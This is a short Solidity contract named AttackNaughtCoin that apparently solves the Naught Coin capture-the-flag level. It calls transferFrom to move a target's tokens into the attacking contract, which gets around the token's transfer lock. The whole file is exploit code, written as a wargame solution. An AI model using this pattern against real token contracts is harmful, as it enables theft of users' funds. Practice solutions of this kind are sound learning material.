// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./naught_coin.sol";


contract AttackNaughtCoin {

    NaughtCoin coinContract;
    address targetAddress;

    constructor(address contractAddress, address target) {
        coinContract = NaughtCoin(contractAddress);
        targetAddress = target;
    }

    function attack(uint amount) public {
        coinContract.transferFrom(targetAddress, address(this), amount);
    }

}

